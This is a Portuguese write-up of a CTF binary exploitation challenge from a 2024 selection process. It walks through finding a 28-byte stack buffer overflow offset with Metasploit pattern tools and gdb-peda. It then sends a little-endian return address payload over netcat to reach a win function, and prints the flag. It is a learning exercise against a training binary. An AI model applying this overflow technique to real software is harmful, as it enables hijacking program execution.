# CTF - Processo seletivo 2ºSemestre 2024 EITS

Gabriel Monteiro - SirMonteiro

## Exploração de Binário (binexp) - Buffer Vazando

O desafio consiste em mandar uma string para uma conexão utilizando o utilitário **netcat** para conseguir a flag, o desafio forneceu o código fonte e o binário, ambos com uma flag genérica.

Pelo nome, foi deduzido que o desafio consiste em um ataque de Buffer Overflow no código.

O primeiro passo foi descobrir o funcionamento básico do programa, assim executando, e analisando o código fonte, foi notado que o programa já informa o endereço de memória da função que escreve na tela a flag (**Vitoria**), pede para o usuário inserir uma string que inicialmente é armazenada em uma cadeia de char alocado dinamicamente com o "_scanf_", e assim, executa uma função que concatena uma mensagem a cadeia de caracteres e escreve o resultado. O ponto de vulnerabilidade do programa é identificado no momento que é copiado uma string de tamanho indeterminado em um buffer de 32 caracteres.

Dessa forma é necessário saber a quantidade de caracteres até o limite do buffer e como manipular a invasão de memória de modo a fazer o programa executar a função "**Vitoria**".

Para descobrir o tamanho (offset) do buffer foi utilizado duas ferramentas do framework do metasploit, juntamente com o debugger gdb, com a extensão peda (Python Exploit Development Assistance), para a instalação no ambiente do Arch Linux é possível com:

```bash
pacman -Syu metasploit gdb peda
echo "source /usr/share/peda/peda.py" >> ~/.gdbinit
```

Deduzindo que o buffer não teria um _offset_ maior que 100 caracteres, foi executado a ferramenta **pattern_create.rb**:

```console
foo@arch:~$ /opt/metasploit/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Foi executado o binário disponibilizado: **desafio**, com o **gdb**:

```bash
gdb desafio
```

no terminal do **gdb-peda** foi executado o seguinte comando para o debugger rodar o binário:

```console
gdb-peda$ run
Starting program: desafio
```

e, assim, inserido o padrão gerado anteriormente:

```console
O alvo: 0x80497a5
Mensagem
>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

O debugger informou que o vazamento de memória ocorreu no endereço **0x62413961** como mostrado abaixo:

```console
Stopped reason: SIGSEGV
0x62413961 in ?? ()
gdb-peda$
```

com esse endereço é executado a ferramenta **pattern_offset.rb**:

```console
foo@arch:~$ /opt/metasploit/tools/exploit/pattern_offset.rb -l 100 -q 62413961
[*] Exact match at offset 28
```

Portanto o tamanho máximo do buffer (offset) é de 28 caracteres.

Para gerar o payload é necessário codificar o endereço da função **Vitoria** (alvo), para ser passado em uma cadeia de caracteres no _endianness_ da arquitetura x86, nesse caso, little-endian (LE), dessa forma o endereço **0x80497a5** dado pelo programa codificado para compor o payload fica, `\xa5\x97\x04\x08`.

Assim, o payload inteiro seria, qualquer 28 caracteres da tabela ASCII para encher o buffer e o endereço da função alvo codificado: `AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x97\x04\x08`.

Finalmente para conseguir a flag foi executado o seguinte comando:

```shell
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x97\x04\x08' | nc <insert IP> <insert port>
```

```console
foo@arch:~$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x97\x04\x08' | nc <insert IP> <insert port>
O alvo: 0x80497a5
Mensagem
> A mensagem eh: "AAAAAAAAAAAAAAAAAAAAAAAAAAA"
eits{v1t0r14_1lc4nc4d4!}
```

Para os estudos até chegar a flag, foi usada as seguintes referências:
https://0xrick.github.io/binary-exploitation/bof3
https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html
https://upload.wikimedia.org/wikipedia/commons/1/1b/ASCII-Table-wide.svg
https://github.com/longld/peda/issues/142
